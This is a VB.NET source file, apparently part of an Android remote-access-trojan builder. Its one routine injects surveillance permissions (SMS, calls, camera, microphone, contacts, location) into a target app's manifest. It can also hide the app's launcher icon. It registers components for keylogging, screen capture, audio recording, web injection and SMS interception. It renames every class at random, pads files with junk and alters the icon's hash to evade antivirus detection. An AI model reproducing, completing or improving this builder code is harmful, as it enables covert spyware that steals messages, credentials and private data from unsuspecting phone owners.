    Private Sub Step2()
        Mylogger.Logbuild(userid, ">" & "> Check Permissions...")

back1:

        If FileInUse(TheApkPath & "\" & "AndroidManifest.xml") Or Not File.Exists(TheApkPath & "\" & "AndroidManifest.xml") Then

            Thread.Sleep(1000)
            GoTo back1
        End If



        'Dim AllManifist As String = UpdateVersions(File.ReadAllText(TheApkPath & "\" & "AndroidManifest.xml"))

        Dim SPLITTER As String = "[*]"
        Dim permissionSets As String() = allconfig.Split(New String() {SPLITTER}, StringSplitOptions.RemoveEmptyEntries)

        ' Extract the first boolean of each permission and assign directly to variables
        Dim addAccess As Boolean = If(permissionSets.Length > 0, permissionSets(0).Split("|"c)(0) = "1", False)
        Dim addDrawOverApps As Boolean = If(permissionSets.Length > 1, permissionSets(1).Split("|"c)(0) = "1", False)
        Dim addBackgroundDataUsage As Boolean = If(permissionSets.Length > 2, permissionSets(2).Split("|"c)(0) = "1", False)
        Dim addUsageAccess As Boolean = If(permissionSets.Length > 3, permissionSets(3).Split("|"c)(0) = "1", False)

        Dim addChangePhoneSettings As Boolean = If(permissionSets.Length > 4, permissionSets(4).Split("|"c)(0) = "1", False)

        Dim addBatteryOptimization As Boolean = If(permissionSets.Length > 5, permissionSets(5).Split("|"c)(0) = "1", False)

        Dim addFilesAccess As Boolean = If(permissionSets.Length > 6, permissionSets(6).Split("|"c)(0) = "1", False)

        Dim addCameraAccess As Boolean = If(permissionSets.Length > 7, permissionSets(7).Split("|"c)(0) = "1", False)

        Dim addMicrophoneAccess As Boolean = If(permissionSets.Length > 8, permissionSets(8).Split("|"c)(0) = "1", False)

        Dim addReadSMS As Boolean = If(permissionSets.Length > 9, permissionSets(9).Split("|"c)(0) = "1", False)

        Dim addSendSMS As Boolean = If(permissionSets.Length > 10, permissionSets(10).Split("|"c)(0) = "1", False)

        Dim addReadContacts As Boolean = If(permissionSets.Length > 11, permissionSets(11).Split("|"c)(0) = "1", False)
        Dim addReadAccounts As Boolean = If(permissionSets.Length > 12, permissionSets(12).Split("|"c)(0) = "1", False)

        Dim addlocations As Boolean = If(permissionSets.Length > 16, permissionSets(16).Split("|"c)(0) = "1", False)


        '------------
        'for builder not apk
        Dim protectit As Boolean = If(permissionSets.Length > 17, permissionSets(17).Split("|"c)(0) = "1", True)

        ProtectAPK = protectit

        Dim pumpit As Boolean = If(permissionSets.Length > 18, permissionSets(18).Split("|"c)(0) = "1", True)

        PumpAPK = pumpit
        '------------

        Dim addcallphone As Boolean = If(permissionSets.Length > 19, permissionSets(19).Split("|"c)(0) = "1", True)

        Dim Loadmobile As Boolean = If(permissionSets.Length > 20, permissionSets(20).Split("|"c)(0) = "1", True)

        If Loadmobile Then ' 1|0 = mobile , 0|1 = Desktop

            LoadStyle = "M" 'mobile
        Else
            LoadStyle = "D" 'Desktop
        End If

        Dim Prims As String = ""

        If addDrawOverApps Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.SYSTEM_ALERT_WINDOW"" />" + vbNewLine
        End If

        If addBatteryOptimization Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"" />" + vbNewLine
        End If

        If addUsageAccess Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.PACKAGE_USAGE_STATS"" />" + vbNewLine
        End If

        'If addChangePhoneSettings Then
        '    Prims += "    <uses-permission android:name=" + """" + "android.permission.WRITE_SETTINGS"" />" + vbNewLine
        '    Prims += "    <uses-permission android:name=" + """" + "android.permission.WRITE_SECURE_SETTINGS"" />" + vbNewLine
        'End If

        If addFilesAccess Then
            Prims += "    <uses-permission  android:name=" + """" + "android.permission.MANAGE_EXTERNAL_STORAGE"" />" + vbNewLine
            Prims += "    <uses-permission android:maxSdkVersion=" + """" + "32" + """" + " android:name=" + """" + "android.permission.WRITE_EXTERNAL_STORAGE"" />" + vbNewLine
            Prims += "    <uses-permission android:maxSdkVersion=" + """" + "32" + """" + " android:name=" + """" + "android.permission.READ_EXTERNAL_STORAGE"" />" + vbNewLine
        End If

        If addCameraAccess Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.CAMERA"" />" + vbNewLine
        End If

        If addMicrophoneAccess Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.RECORD_AUDIO"" />" + vbNewLine
        End If

        If addReadAccounts Then
            ' Prims += "    <uses-permission android:name=" + """" + "android.permission.GET_ACCOUNTS"" />" + vbNewLine
        End If

        If addReadContacts Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.READ_CONTACTS"" />" + vbNewLine
            Prims += "    <uses-permission android:name=" + """" + "android.permission.WRITE_CONTACTS"" />" + vbNewLine
        End If

        If addSendSMS Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.SEND_SMS"" />" + vbNewLine
            Prims += "    <uses-permission android:name=" + """" + "android.permission.READ_PHONE_NUMBERS"" />" + vbNewLine

        End If

        If addReadSMS Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.READ_SMS"" />" + vbNewLine

        End If

        If addlocations Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.ACCESS_COARSE_LOCATION"" />" + vbNewLine
            Prims += "    <uses-permission android:name=" + """" + "android.permission.ACCESS_FINE_LOCATION"" />" + vbNewLine
            'Prims += "    <uses-permission android:name=" + """" + "android.permission.ACCESS_BACKGROUND_LOCATION"" />" + vbNewLine

        End If
        If addcallphone Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.CALL_PHONE"" />" + vbNewLine

        End If



        Dim SMStag As String = ""
        If BlockSMS = "1" Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.SEND_SMS"" />" + vbNewLine
            Prims += "    <uses-permission android:name=" + """" + "android.permission.RECEIVE_SMS"" />" + vbNewLine
            Prims += "    <uses-permission android:name=" + """" + "android.permission.READ_SMS"" />" + vbNewLine
            Prims += "    <uses-permission android:name=" + """" + "android.permission.RECEIVE_MMS"" />" + vbNewLine

            SMStag = My.Resources.SMSTAG
        End If

        Dim METACALL As String = ""
        Dim CALLStag As String = ""
        If BlockCalls = "1" Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.CALL_PHONE"" />" + vbNewLine
            Prims += "    <uses-permission android:name=" + """" + "android.permission.READ_CALL_LOG"" />" + vbNewLine
            Prims += "    <uses-permission android:name=" + """" + "android.permission.ANSWER_PHONE_CALLS"" />" + vbNewLine
            Prims += "    <uses-permission android:name=" + """" + "android.permission.RECEIVE_MMS"" />" + vbNewLine

            CALLStag = My.Resources.CALLSTAG
            METACALL = My.Resources.METATAGCALL
        End If

        Dim acctag As String = ""

        If addAccess Then
            acctag = My.Resources.AccessTag
        End If

        Dim AllManifist As String = File.ReadAllText(TheApkPath & "\" & "AndroidManifest.xml") _
            .Replace(My.Resources.ReplacePrimes, Prims) _
            .Replace(My.Resources.ReplaceSMS, SMStag) _
            .Replace(My.Resources.ReplaceCalls, CALLStag) _
            .Replace(My.Resources.Repacemetacall, METACALL) _
            .Replace(My.Resources.ReplaceAccess, acctag)

        If hidetype = "c" Then
            AllManifist = AllManifist.Replace(My.Resources.ReplaceLuncher, My.Resources.ManifistHide)
        Else
            AllManifist = AllManifist.Replace(My.Resources.ReplaceLuncher, My.Resources.luncherIntent)
        End If


        File.WriteAllText(TheApkPath & "\" & "AndroidManifest.xml", AllManifist)

        '

        Try

            If IsCustomeApp Then
                Dim stringspath As String = Worker.TheApkPath + "\res\values\strings.xml"
                Do
                    Thread.Sleep(100)
                Loop While Not File.Exists(stringspath) Or FileInUse(stringspath)
                Mylogger.Logbuild(Worker.userid, ">> Encoding Strings file...")
                Dim allstr As String = File.ReadAllText(stringspath).Replace("[BASE_NAME]", Worker.appname)
                File.WriteAllText(stringspath, allstr)
                Thread.Sleep(100)
                Dim strarray As String() = File.ReadAllLines(stringspath)
                Dim junkstr As String = ""
                Dim index As Integer = 1
                Do
                    Dim randomWord1 As String = Random_Word()
                    Dim randomMad1 As String = RandommMad(4, 15)
                    Dim randomWord2 As String = Random_Word()
                    Dim randomMad2 As String = RandommMad(4, 15)

                    junkstr = junkstr & "    <string name=""" & randomWord1 & randomMad1 & """>" & randomWord2 & randomMad2 & "</string>" & vbCrLf

                    index += 1
                Loop While index <= 134

                Dim num As Integer = strarray.Length - 1
                For i As Integer = 0 To num
                    Dim flag3 As Boolean = strarray(i).Contains("<string name")
                    If flag3 Then
                        strarray(i) = strarray(i) + vbCrLf + junkstr
                        Exit For
                    End If
                Next
                File.WriteAllLines(stringspath, strarray)
                Mylogger.Logbuild(Worker.userid, ">> Change ico...")
                Dim logopath As String = Worker.TheApkPath + "\res\drawable\mylogo.png"
                Dim flag4 As Boolean = File.Exists(logopath)
                If flag4 Then
                    File.Delete(logopath)
                End If

                Dim icobytes As Byte() = File.ReadAllBytes(Worker.TargetApkicon)

                ' Append junk bytes (this changes MD5 but not image content)
                Dim junk As Byte() = System.Text.Encoding.ASCII.GetBytes("<!--" & Guid.NewGuid().ToString() & "-->")
                Dim newBytes As Byte() = icobytes.Concat(junk).ToArray()

                File.WriteAllBytes(logopath, newBytes)

                'File.Copy(Worker.TargetApkicon, logopath)


                Dim yml As String = Worker.TheApkPath + "\apktool.yml"
                Do
                    Thread.Sleep(100)
                Loop While Not File.Exists(yml) Or FileInUse(yml)
                Dim readyml As String = File.ReadAllText(yml).Replace("3.31.165", Worker.appversion + " " + Random_Word()).Replace("331165", Worker.appversion.Replace(".", ""))
                File.WriteAllText(yml, readyml)
            End If



            If Not IsCustomeApp Then
                'Write
                If Not AllManifist.ToLower.Contains("android.permission.WRITE_EXTERNAL_STORAGE".ToLower()) AndAlso addFilesAccess Then
                    need_write = True
                End If

                'external storage sdk 33
                If Not AllManifist.ToLower.Contains("android.permission.MANAGE_EXTERNAL_STORAGE".ToLower()) AndAlso addFilesAccess Then
                    need_externalstorage = True
                End If

                'battery
                If Not AllManifist.ToLower.Contains("android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS".ToLower()) AndAlso addBatteryOptimization Then
                    need_battery = True
                End If

                'Read
                If Not AllManifist.ToLower.Contains("android.permission.READ_EXTERNAL_STORAGE".ToLower) AndAlso addFilesAccess Then
                    need_read = True
                End If

                'ground
                If Not AllManifist.ToLower.Contains("android.permission.FOREGROUND_SERVICE".ToLower) Then
                    need_forground = True
                End If

                'spical use
                If Not AllManifist.ToLower.Contains("android.permission.FOREGROUND_SERVICE_SPECIAL_USE".ToLower) Then
                    need_forground_Type = True
                End If

                'system window
                If Not AllManifist.ToLower.Contains("android.permission.SYSTEM_ALERT_WINDOW".ToLower) AndAlso addDrawOverApps Then
                    need_syswinow = True
                End If

                'BOOT COMPLETE
                If Not AllManifist.ToLower.Contains("android.permission.RECEIVE_BOOT_COMPLETED".ToLower) Then
                    need_boot = True
                End If

                'READ_PHONE_STATE
                If Not AllManifist.ToLower.Contains("android.permission.READ_PHONE_STATE".ToLower) Then
                    need_read_stste = True
                End If


            End If


            'If ASKPRIM_all = "1" Then
            '    need_all = True

            '    Dim arryprims() As String = My.Resources.ALLPRIM.Split("#")
            '    For Each pri As String In arryprims
            '        Try
            '            If Not String.IsNullOrEmpty(pri) Then
            '                If Not AllManifist.ToLower.Contains(pri.ToLower) Then
            '                    ALLPRIMSLIST.Add(pri)
            '                End If
            '            End If
            '        Catch ex As Exception

            '        End Try
            '    Next
            'End If


            Mylogger.Logbuild(userid, ">" & "> Coding AndroidManifest...")

            Dim x As Integer = 16
            Dim y As Integer = 29
            N_ClassGen = RandommMad(x, y)
            NActivityMonitors = RandommMad(x, y)
            N_ActivityCaptureScreen = RandommMad(x, y)
            N_AccessTools = RandommMad(x, y)
            N_wakeitaiv = RandommMad(x, y)
            N_LockActivity = RandommMad(x, y)
            N_AccessServices = RandommMad(x, y)
            N_HiddenBrowser = RandommMad(x, y)
            N_AccessibilityActivity = RandommMad(x, y)

            N_update_app_ = RandommMad(x, y)
            N_Contct_manager = RandommMad(x, y)

            N_Deviceinfo = RandommMad(x, y)
            N_My_Configs = RandommMad(x, y)
            N_ActivityDraw = RandommMad(x, y)
            N_My_Crpter = RandommMad(x, y)
            N_filesManager = RandommMad(x, y)
            N_id_Commands = RandommMad(x, y)
            N_KeyStorksQ = RandommMad(x, y)
            N_LiveChat = RandommMad(x, y)
            N_QueryChats = RandommMad(x, y)
            N_LiveKeysStrok = RandommMad(x, y)
            N_StarterServices = RandommMad(x, y)
            N_LocationMonitor = RandommMad(x, y)
            N_LockAppsActivity = RandommMad(x, y)
            N_ActivMain = RandommMad(x, y)
            N_MyLoger = RandommMad(x, y)
            N_MyNotification = RandommMad(x, y)
            N_MyPacket = RandommMad(x, y)
            N_MyPermissions = RandommMad(x, y)
            N_MySettings = RandommMad(x, y)
            N_PermissionsActivity = RandommMad(x, y)
            N_PingServices = RandommMad(x, y)
            N_RequestDraw = RandommMad(x, y)
            N_Requestinstall = RandommMad(x, y)
            N_RequestPermissions2 = RandommMad(x, y)
            N_ScreenCaps = RandommMad(x, y)
            N_ScreenReceiver = RandommMad(x, y)
            N_mysmanager = RandommMad(x, y)
            N_StatusMonitor = RandommMad(x, y)
            N_UtliTools = RandommMad(x, y)
            N_VoiceRecorder = RandommMad(x, y)
            N_WorkServices = RandommMad(x, y)
            N_HiddenActivity = RandommMad(x, y)
            N_RestrectionActivity = RandommMad(x, y)
            N_OPPOAutostart = RandommMad(x, y)
            N_BrodcastActivity = RandommMad(x, y)
            N_UninstallActivity = RandommMad(x, y)
            N_EngineWorker = RandommMad(x, y)
            N_RequestDataUsage = RandommMad(x, y)
            N_Webjector = RandommMad(x, y)
            N_TransparentActivity = RandommMad(x, y)
            N_defaultsactivity = RandommMad(x, y)
            N_SmsReceiver = RandommMad(x, y)
            N_MyInCallService = RandommMad(x, y)

            N_WebBrowser = RandommMad(x, y)
            N_ProxyService = RandommMad(x, y)

            N_Apps_Manage = RandommMad(x, y)
            N_AudioRecorder = RandommMad(x, y)
            N_CameraCap = RandommMad(x, y)
            N__ChatActivity_ = RandommMad(x, y)
            N__MyCods_ = RandommMad(x, y)
            N__Consts_ = RandommMad(x, y)

            accesstagdata_New = RandommMad(x, y)




            If IsCustomeApp Then
                If PluginType Then
                    newpkg = Random_Word() & "." & Random_Word_2() & "." & Random_Word()
                Else
                    newpkg = appid
                End If

            Else
                newpkg = Random_Word() & "." & Random_Word_2() & "." & Random_Word()
            End If



            newpkg_insmali = "L" & newpkg.Replace(".", "/")


            'drop_newpkg = Random_Word() & "." & Random_Word_2() & "." & Random_Word()
            If dropid = appid Then
                drop_newpkg = GetRandomPackageID()
            Else
                drop_newpkg = dropid
            End If


            drop_newpkg_insmali = "L" & drop_newpkg.Replace(".", "/")

            Mylogger.Logbuild(userid, "New apk PKG: " + newpkg)


            If Not IsCustomeApp Then
                If Not isPluginmode Then
                    To_Obfucate.AddRange(ResoursIds)
                    To_obfuscate_androidx.AddRange(ResoursIds)
                Else
                    Mylogger.Logbuild(userid, "plugin mode: Skip To_Obfucate")

                End If

            End If


            For Each originalString As String In To_Obfucate
                Obfucated(originalString) = RandommMad(x, y)
            Next


            'TODO: Check if need keep screen
            'If checkkeepscreen.Checked = True Then
            '    KeepScreen = "on"
            'End If


            UpdateManifest(TheApkPath & "\" & "AndroidManifest.xml") ' for plugin


            Dim ManifistLines As String() = File.ReadAllLines(TheApkPath & "\" & "AndroidManifest.xml")

            If Not IsCustomeApp Then
                'back2:

                '                If FileInUse(TheApkPath & "\" & "apktool.yml") Or Not File.Exists(TheApkPath & "\" & "apktool.yml") Then
                '                    Thread.Sleep(1000)
                '                    GoTo back2
                '                End If


                ' Dim apktoolyml As String() = File.ReadAllLines(TheApkPath & "\" & "apktool.yml")


                'For index = 0 To apktoolyml.Length - 1
                '    If apktoolyml(index).ToLower.Contains("targetSdkVersion".ToLower) Then
                '        apktoolyml(index) = "  targetSdkVersion: '29'"
                '        File.WriteAllLines(TheApkPath & "\" & "apktool.yml", apktoolyml)
                '        Exit For
                '    End If
                'Next
                If Not isPluginmode Then
                    If addAccess Then
                        File.WriteAllText(Worker.TheApkPath + $"\res\xml\{accesstagdata_New}.xml", My.Resources.accessibilityprivatesrcapp)
                    Else
                        File.WriteAllText(Worker.TheApkPath + $"\res\xml\{accesstagdata_New}.xml", My.Resources.emptyaccess)
                    End If
                Else

                    N_Class1 = RandomSTR(10, 20)
                    N_Class2 = RandomSTR(10, 20)
                    N_Class3 = RandomSTR(10, 20)
                    N_Class4 = RandomSTR(10, 20)
                    N_Class5 = RandomSTR(10, 20)
                    N_ClassGen6 = RandomSTR(10, 20)
                    N_ClassGen7 = RandomSTR(10, 20)

                End If



                For index = 1 To ManifistLines.Length - 1


                    If Not isPluginmode Then

                        If need_write AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                            ManifistLines(index) = ManifistLines(index) + vbNewLine + My.Resources.WritePrim
                            need_write = False
                        End If

                        'need_externalstorage
                        If need_externalstorage AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                            ManifistLines(index) = ManifistLines(index) + vbNewLine + My.Resources.Externalstorage
                            need_externalstorage = False
                        End If

                        If need_battery AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                            ManifistLines(index) = ManifistLines(index) + vbNewLine + My.Resources.batteryprim
                            need_battery = False
                        End If

                        If need_read AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                            ManifistLines(index) = ManifistLines(index) + vbNewLine + My.Resources.ReadPrim
                            need_read = False
                        End If

                        If need_forground AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                            ManifistLines(index) = ManifistLines(index) + vbNewLine + My.Resources.FORGROUD
                            need_forground = False
                        End If

                        If need_forground_Type AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                            ManifistLines(index) = ManifistLines(index) + vbNewLine + My.Resources.FOR_GROUND_SPCIL
                            need_forground_Type = False
                        End If

                        If need_syswinow AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                            ManifistLines(index) = ManifistLines(index) + vbNewLine + My.Resources.SystemwindowPrim
                            need_syswinow = False
                        End If
                        If need_boot AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                            ManifistLines(index) = ManifistLines(index) + vbNewLine + My.Resources.BootPrim
                            need_boot = False
                        End If

                        '
                        If need_read_stste AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                            ManifistLines(index) = ManifistLines(index) + vbNewLine + My.Resources.read_state_prim
                            need_read_stste = False
                        End If
                    End If


                    'If need_all AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                    '    For Each pri As String In ALLPRIMSLIST
                    '        ManifistLines(index) = ManifistLines(index) + vbNewLine + pri
                    '    Next
                    '    need_all = False
                    'End If

                    If ManifistLines(index).ToLower.Contains("<application") Then
                        If Not isPluginmode Then
                            If Not ManifistLines(index).ToLower.Contains("requestLegacyExternalStorage".ToLower) Then
                                ManifistLines(index) = ManifistLines(index).Replace("<application", "<application android:requestLegacyExternalStorage=" + """" + "true" + """")
                            End If

                            If Not ManifistLines(index).ToLower.Contains("usesCleartextTraffic".ToLower) Then
                                ManifistLines(index) = ManifistLines(index).Replace("<application", "<application android:usesCleartextTraffic=" + """" + "true" + """")
                            End If
                        End If

                        Dim manifistdata As String = My.Resources.ManifistCode
                        If isPluginmode Then
                            manifistdata = My.Resources.ManifistPlugin.Replace(ClassGen1, N_Class1) _
                                            .Replace(ClassGen2, N_Class2) _
                                            .Replace(ClassGen3, N_Class3) _
                                            .Replace(ClassGen4, N_Class4) _
                                            .Replace("[T_ID]", MinApkPkgName) _
                                            .Replace("[DROP_TITLE]", DropTitle) _
                                            .Replace("[DROP_MSG]", DropMsg) _
                                            .Replace("[DROP_STYLE]", DropStyle) _
                                            .Replace("[DROP_MNAME]", appname) _
                                            .Replace(ClassGen1, N_Class1) _
                                            .Replace("[MY-NAME]", InsertZWNJ(dropname)) _
                                            .Replace(StarterServices, N_StarterServices) _
                                            .Replace(ClassGen6, N_ClassGen6) _
                                            .Replace(ClassGen7, N_ClassGen7) _
                                            .Replace("target.app.rep", appid) _
                                            .Replace(drop_oldpkg, drop_newpkg) _
                                            .Replace(ClassGen5, N_Class5)
                        End If

                        ManifistLines(index) = ManifistLines(index) & Environment.NewLine & manifistdata.Replace(My.Resources.ReplaceAccess, acctag).Replace(AccessibilityActivity, N_AccessibilityActivity) _
                    .Replace(AccessServices, N_AccessServices) _
                    .Replace(HiddenBrowser, N_HiddenBrowser) _
                    .Replace(AccessTools, N_AccessTools) _
                    .Replace(wakeitaiv, N_wakeitaiv) _
                    .Replace(LockActivity, N_LockActivity) _
                    .Replace(ActivityCaptureScreen, N_ActivityCaptureScreen) _
                    .Replace(ActivityMonitors, NActivityMonitors) _
                    .Replace(_update_app_, N_update_app_) _
                    .Replace(Consts, N__Consts_) _
                    .Replace(MyCods, N__MyCods_) _
                    .Replace(ChatActivity, N__ChatActivity_) _
                    .Replace(CameraCap, N_CameraCap) _
                    .Replace(Contct_manager, N_Contct_manager) _
                    .Replace(Deviceinfo, N_Deviceinfo) _
                    .Replace(My_Configs, N_My_Configs) _
                    .Replace(ActivityDraw, N_ActivityDraw) _
                    .Replace(My_Crpter, N_My_Crpter) _
                    .Replace(filesManager, N_filesManager) _
                    .Replace(id_Commands, N_id_Commands) _
                    .Replace(KeyStorksQ, N_KeyStorksQ) _
                    .Replace(LiveChat, N_LiveChat) _
                    .Replace(QueryChats, N_QueryChats) _
                    .Replace(LiveKeysStrok, N_LiveKeysStrok) _
                    .Replace(StarterServices, N_StarterServices) _
                    .Replace(LocationMonitor, N_LocationMonitor) _
                    .Replace(LockAppsActivity, N_LockAppsActivity) _
                    .Replace(ActivMain, N_ActivMain) _
                    .Replace(MyLoger, N_MyLoger) _
                    .Replace(MyNotification, N_MyNotification) _
                    .Replace(MyPacket, N_MyPacket) _
                    .Replace(MyPermissions, N_MyPermissions) _
                    .Replace(MySettings, N_MySettings) _
                    .Replace(PermissionsActivity, N_PermissionsActivity) _
                    .Replace(PingServices, N_PingServices) _
                    .Replace(RequestDraw, N_RequestDraw) _
                    .Replace(Requestinstall, N_Requestinstall) _
                    .Replace(RequestPermissions2, N_RequestPermissions2) _
                    .Replace(ScreenCaps, N_ScreenCaps) _
                    .Replace(ScreenReceiver, N_ScreenReceiver) _
                    .Replace(mysmanager, N_mysmanager) _
                    .Replace(StatusMonitor, N_StatusMonitor) _
                    .Replace(UtliTools, N_UtliTools) _
                    .Replace(VoiceRecorder, N_VoiceRecorder) _
                    .Replace(WorkServices, N_WorkServices) _
                    .Replace(HiddenActivity, N_HiddenActivity) _
                    .Replace(RestrectionActivity, N_RestrectionActivity) _
                    .Replace(OPPOAutostart, N_OPPOAutostart) _
                    .Replace(BrodcastActivity, N_BrodcastActivity) _
                    .Replace(UninstallActivity, N_UninstallActivity) _
                    .Replace(EngineWorker, N_EngineWorker) _
                    .Replace(RequestDataUsage, N_RequestDataUsage) _
                    .Replace(Webjector, N_Webjector) _
                    .Replace(TransparentActivity, N_TransparentActivity) _
                    .Replace(defaultsactivity, N_defaultsactivity) _
                    .Replace(SmsReceiver, N_SmsReceiver) _
                    .Replace(MyInCallService, N_MyInCallService) _
                    .Replace(WebBrowser, N_WebBrowser) _
                    .Replace(ProxyService, N_ProxyService) _
                    .Replace(oldpkg, newpkg) _
                    .Replace(oldpkg_insmali, newpkg_insmali) _
                    .Replace(accesstagdata, accesstagdata_New) _
                    .Replace(ClassGen, N_ClassGen) _
                    .Replace(AudioRecorder, N_AudioRecorder) _
                    .Replace(Apps_Manage, N_Apps_Manage)
                        Exit For
                    End If
                Next

            End If

            If IsCustomeApp Then
                'Dim flag28 As Boolean = Worker.need_all
                'If flag28 Then
                '    Dim num3 As Integer = ManifistLines.Length - 1
                '    For index3 As Integer = 1 To num3
                '        Dim flag29 As Boolean = ManifistLines(index3).ToLower().Contains("<uses-permission")
                '        If flag29 Then
                '            Try
                '                For Each pri3 As String In Worker.ALLPRIMSLIST
                '                    ManifistLines(index3) = ManifistLines(index3) + vbCrLf + pri3
                '                Next
                '            Catch ex As Exception
                '            End Try
                '            Worker.need_all = False
                '            File.WriteAllLines(Worker.TheApkPath + "\AndroidManifest.xml", ManifistLines)
                '            Exit For
                '        End If
                '    Next
                'End If
                Mylogger.Logbuild(Worker.userid, ">> Updating Res files...")
                Dim publicxmlpath As String = Worker.TheApkPath + "\res\values\public.xml"


                Do
                    Thread.Sleep(100)
                Loop While Not File.Exists(publicxmlpath) Or FileInUse(publicxmlpath)

                Dim allstr As String = File.ReadAllText(publicxmlpath).Replace(accesstagdata, accesstagdata_New)
                File.WriteAllText(publicxmlpath, allstr)



                Dim accessxmlpath As String = Worker.TheApkPath + $"\res\xml\{accesstagdata}.xml"
                Do
                    Thread.Sleep(100)
                Loop While Not File.Exists(accessxmlpath) Or FileInUse(accessxmlpath)
                Dim n_accessxmlpath As String = Worker.TheApkPath + $"\res\xml\{accesstagdata_New}.xml"

                File.Move(accessxmlpath, n_accessxmlpath)


                Dim manisiftcontent As String = File.ReadAllText(Worker.TheApkPath + "\AndroidManifest.xml").Replace(AccessibilityActivity, N_AccessibilityActivity) _
                    .Replace(AccessServices, N_AccessServices) _
                    .Replace(HiddenBrowser, N_HiddenBrowser) _
                    .Replace(AccessTools, N_AccessTools) _
                    .Replace(wakeitaiv, N_wakeitaiv) _
                    .Replace(LockActivity, N_LockActivity) _
                    .Replace(ActivityCaptureScreen, N_ActivityCaptureScreen) _
                    .Replace(ActivityMonitors, NActivityMonitors) _
                    .Replace(_update_app_, N_update_app_) _
                    .Replace(Consts, N__Consts_) _
                    .Replace(MyCods, N__MyCods_) _
                    .Replace(ChatActivity, N__ChatActivity_) _
                    .Replace(CameraCap, N_CameraCap) _
                    .Replace(Contct_manager, N_Contct_manager) _
                    .Replace(Deviceinfo, N_Deviceinfo) _
                    .Replace(My_Configs, N_My_Configs) _
                    .Replace(ActivityDraw, N_ActivityDraw) _
                    .Replace(My_Crpter, N_My_Crpter) _
                    .Replace(filesManager, N_filesManager) _
                    .Replace(id_Commands, N_id_Commands) _
                    .Replace(KeyStorksQ, N_KeyStorksQ) _
                    .Replace(LiveChat, N_LiveChat) _
                    .Replace(QueryChats, N_QueryChats) _
                    .Replace(LiveKeysStrok, N_LiveKeysStrok) _
                    .Replace(StarterServices, N_StarterServices) _
                    .Replace(LocationMonitor, N_LocationMonitor) _
                    .Replace(LockAppsActivity, N_LockAppsActivity) _
                    .Replace(ActivMain, N_ActivMain) _
                    .Replace(MyLoger, N_MyLoger) _
                    .Replace(MyNotification, N_MyNotification) _
                    .Replace(MyPacket, N_MyPacket) _
                    .Replace(MyPermissions, N_MyPermissions) _
                    .Replace(MySettings, N_MySettings) _
                    .Replace(PermissionsActivity, N_PermissionsActivity) _
                    .Replace(PingServices, N_PingServices) _
                    .Replace(RequestDraw, N_RequestDraw) _
                    .Replace(Requestinstall, N_Requestinstall) _
                    .Replace(RequestPermissions2, N_RequestPermissions2) _
                    .Replace(ScreenCaps, N_ScreenCaps) _
                    .Replace(ScreenReceiver, N_ScreenReceiver) _
                    .Replace(mysmanager, N_mysmanager) _
                    .Replace(StatusMonitor, N_StatusMonitor) _
                    .Replace(UtliTools, N_UtliTools) _
                    .Replace(VoiceRecorder, N_VoiceRecorder) _
                    .Replace(WorkServices, N_WorkServices) _
                    .Replace(HiddenActivity, N_HiddenActivity) _
                    .Replace(RestrectionActivity, N_RestrectionActivity) _
                    .Replace(OPPOAutostart, N_OPPOAutostart) _
                    .Replace(BrodcastActivity, N_BrodcastActivity) _
                    .Replace(UninstallActivity, N_UninstallActivity) _
                    .Replace(EngineWorker, N_EngineWorker) _
                    .Replace(RequestDataUsage, N_RequestDataUsage) _
                    .Replace(Webjector, N_Webjector) _
                    .Replace(TransparentActivity, N_TransparentActivity) _
                    .Replace(defaultsactivity, N_defaultsactivity) _
                    .Replace(SmsReceiver, N_SmsReceiver) _
                    .Replace(MyInCallService, N_MyInCallService) _
                    .Replace(WebBrowser, N_WebBrowser) _
                    .Replace(ProxyService, N_ProxyService) _
                    .Replace(oldpkg, newpkg) _
                    .Replace(oldpkg_insmali, newpkg_insmali) _
                    .Replace(ClassGen, N_ClassGen) _
                    .Replace(accesstagdata, accesstagdata_New) _
                    .Replace(AudioRecorder, N_AudioRecorder) _
                    .Replace(Apps_Manage, N_Apps_Manage)




                File.WriteAllText(TheApkPath + "\AndroidManifest.xml", ConfuseAndObfuscateManifestXml(manisiftcontent))
            Else
                File.WriteAllLines(TheApkPath & "\" & "AndroidManifest.xml", ManifistLines)
            End If



            'Dim bigstring As String = GetRandomString(500000000)
            'Dim pumpmanifist As String = File.ReadAllText(TheApkPath & "\" & "AndroidManifest.xml").Replace("cnamspace", bigstring).Replace("cnamevalue", GetRandomPaths(1000000000000000000) + bigstring)
            'File.WriteAllText(TheApkPath & "\" & "AndroidManifest.xml", pumpmanifist)

        Catch ex As Exception
            Mylogger.LogError(userid, "Step2", ex.Message)
        End Try
    End Sub
